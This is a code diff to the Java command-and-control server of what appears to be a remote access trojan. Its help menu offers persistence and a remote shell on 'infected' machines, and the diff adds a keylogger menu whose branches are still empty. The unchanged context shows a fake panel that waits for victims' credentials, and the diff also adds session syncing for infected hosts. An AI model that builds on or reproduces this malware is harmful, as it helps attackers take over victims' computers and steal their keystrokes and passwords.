@@ -30,6 +30,7 @@ public class Server implements Runnable {
                     System.out.println("HELP MENU:");
                     System.out.println("\tWORKING - persist - initiate persistance on remote machine");
                     System.out.println("\tWORKING - shell - enter a stateless shell environment");
+                    System.out.println("\tIN PROGRESS - keylogger - track keypresses of infected machine");
                     //System.out.println("\tIN PROGRESS - upload - open prompt for uploading a file");
                     //System.out.println("\tIN PROGRESS - download - open prompt for downloading a remote file");
                     ///System.out.println("\tIN PROGRESS - screenshot - take a screenshot of the remote machine");
@@ -82,6 +83,21 @@ public class Server implements Runnable {
                         System.out.println("session might be offline!");
                     }
                 }
+                if (command.equals("keylogger")) {
+                    System.out.println("keylogging module initiated");
+                    System.out.println("Select Option:");
+                    System.out.println("0 - start keylogger");
+                    System.out.println("1 - stop keylogger");
+                    System.out.println("2 - retrieve keypresses");
+                    int choice = Keyboard.readInt();
+                    if (choice==0) {
+                        
+                    } else if (choice==1) {
+                        
+                    } else if (choice==2) {
+                        
+                    }
+                }
                 if (command.equals("upload")) {
                     System.out.println("file upload initiated");
                     
@@ -116,7 +132,7 @@ public class Server implements Runnable {
                     System.out.println("how long would you like the panel to remain in seconds?");
                     int seconds = (int)Keyboard.readDouble();
                     ps.println(seconds);
-                    din.readLine();
+                    //din.readLine();
                     String line = "";
                     System.out.println("WINDOW INITIATED\nLISTENING FOR CREDENTIALS...\n\n");
                     while(!line.equals("{}{}{}")) {
@@ -138,18 +154,28 @@ public class Server implements Runnable {
                     }
                 }
                 if (command.equals("selectsession")) {
+                    int tsesnum = 0;
                     try {
                         System.out.println("\nenter a valid session #:");
                         int sesnum = Keyboard.readInt();
+                        tsesnum = sesnum;
                         s = sessions.get(sesnum);
                         ps = new PrintStream(s.getOutputStream());
                         os = s.getOutputStream();
                         din = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                        ps.println("a");
+                        String chk = din.readLine();
+                        if (!chk.equals("a")) {
+                            System.out.println("DATA COMMUNICATION ERROR - SESSION MIGHT BE OUT OF SYNC");
+                            break;
+                        }
                         System.out.println("now connected to session " + sesnum);
                         System.out.println("connected session IP is " + s.getInetAddress());
                         System.out.println("connected session HOSTNAME is " + hostnames.get(sesnum));
                     } catch (Exception e) {
-                        System.out.println("failed to change session");
+                        System.out.println("Critical error communicating with session - terminating connection");
+                        sessions.remove(tsesnum);
+                        hostnames.remove(tsesnum);
                     }
                 }
             }
